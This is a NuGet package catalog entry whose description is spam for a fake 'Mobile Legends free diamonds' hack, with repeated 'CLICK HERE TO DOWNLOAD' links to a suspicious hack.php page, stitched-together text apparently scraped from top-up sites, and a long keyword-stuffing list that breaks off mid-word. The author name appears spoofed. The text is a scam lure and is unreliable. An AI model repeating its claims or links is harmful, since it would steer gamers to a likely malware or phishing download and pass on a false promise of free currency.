{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.16.38/_mobile-legends-free-diamonds-working-2022-version-yyj.8.2.9.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "b48d4cd8-1e5b-4fd4-bceb-614375182a26",
  "catalog:commitTimeStamp": "2022-01-26T16:16:38.259354Z",
  "created": "2022-01-26T16:14:28.407Z",
  "description": "# _Mobile Legends Free Diamonds Working 2022 Version yyj\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\n\nMobile Legends Free Diamond ML No Ban % Safe OK, the first thing you do. Click the Diamond Plus Button. Then click 50 times on Plus. Here you can freely make friends and discuss any MLBB game strategies, heroes, new updates and etc. Besides, we will launch free diamonds giveaway. Mobile Legends Free Diamonds Generator For. Android and iOS. Click Here To Access. A Mobile Legends Hack is any tool, app, software, method.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\nGetting Diamonds for Free in Mobile Legends The best way to get plenty of Diamonds is to spend money on the game. However, not everyone is a fan of doing this. Instead, you can earn Diamonds with the following methods. Streaming Mobile Legends Much like streaming on YouTube and Twitch, viewers can gift streamers Diamonds. The best price to top up Mobile Legends Diamonds. Only on JollyMax! Diamonds. The best price to top up Mobile Legends Diamonds. Only on JollyMax! More Info. Diamonds. Twilight Pass. Starlight Member. 1. Select the Products. 10 Diamonds + 1 Bonus. 10% Off. 20 Diamonds + 2 Bonus.  · MOD APP for DIAMOND Mobile Legend 15, free diamonds With this application we get 15, free diamonds as seen in the Mobile Legends ID channel video, but this application will not work if we do not use HOTSPOT SHIELD VPN as seen in the Mobile Legends ID video DOWNLOAD 2. VPN HOTSPOT SHIELD PREMIUM.\n\nmobile legends free diamonds apk, mobile legends free diamonds daily, mobile legends free diamonds no survey, mobile legends free diamonds generator, mobile legends free diamonds apk 2021, mobile legends free diamonds hack, mobile legends free diamonds app, mobile legends free diamonds redeem code, mobile legends free diamonds apk mod, mobile legends free diamonds and skin, mobile legends free diamonds and battle points, mobile legends free diamonds and coins, mobile legends free diamonds apk no ban, mobile legends free diamonds no ban, mobile legends free diamonds 2021, mobile legends diamond free buy, mobile legends free diamonds and battle points generator, mobile legends free diamonds and battle points apk, mobile legends hack free diamonds and battle points, mobile legends bang bang free diamonds, mobile legends free diamonds code, mobile legends free diamonds cheat, mobile legends free diamonds.com, mobile legends free diamonds claim, mobile legends free diamond code 2021, mobile legends free diamonds redeem code 2020, mobile legends free diamonds download, mobile legends free diamonds draw 2021 – draw.newmlbbeve.tk free skin, mobile legends free diamonds daily apk, mobile legends free diamonds daily ios, instant mobile legends free diamonds daily rewards, mobile legends hack free diamonds download, mobile legends unlimited diamonds free download, mobile legends free diamonds event, mobile legends diamond free easy, mobile legends free skin and diamonds event, mobile legends free skin and diamond, mobile legends earn free diamonds, how to get diamonds in mobile legends for free easy, mobile legends free diamonds file, mobile legends how to get diamonds for free, mobile legends free diamond zip file, mobile legends free diamonds free skin, mobile legends free diamonds free coins, mobile legends. site free fire diamond, mobile legends hack diamond free fire, mobile legends diamonds for free, mobile legends free diamonds game, mobile legends free diamonds generator 2021, mobile legends free diamonds google sites, mobile legends free diamonds generator no human verification, mobile legends free diamonds generator 2020, mobile legends free diamonds giveaway, mobile legends diamond free give, mobile legends free diamonds how to get, mobile legends free diamonds hack generator, mobile legends free diamonds hack apk, mobile legends fre",
  "id": "_Mobile-Legends-Free-Diamonds-Working-2022-Version-yyj",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T16:16:31.317Z",
  "listed": true,
  "packageHash": "ktEA2Xuw5sE9+pfAGQp3l8MjyGxQS+NWQU+d0ZGVYzZdJfrxO6g41OED84R4bsqnxkQru4nbQeTa7JFofponng==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11475,
  "published": "2022-01-26T16:14:28.407Z",
  "requireLicenseAcceptance": false,
  "title": "_Mobile-Legends-Free-Diamonds-Working-2022-Version-yyj",
  "verbatimVersion": "8.2.9",
  "version": "8.2.9",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.16.38/_mobile-legends-free-diamonds-working-2022-version-yyj.8.2.9.json#rclvxretxf.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1349,
      "fullName": "rclvxretxf.nuspec",
      "length": 4480,
      "name": "rclvxretxf.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.16.38/_mobile-legends-free-diamonds-working-2022-version-yyj.8.2.9.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9466,
      "fullName": ".signature.p7s",
      "length": 9466,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}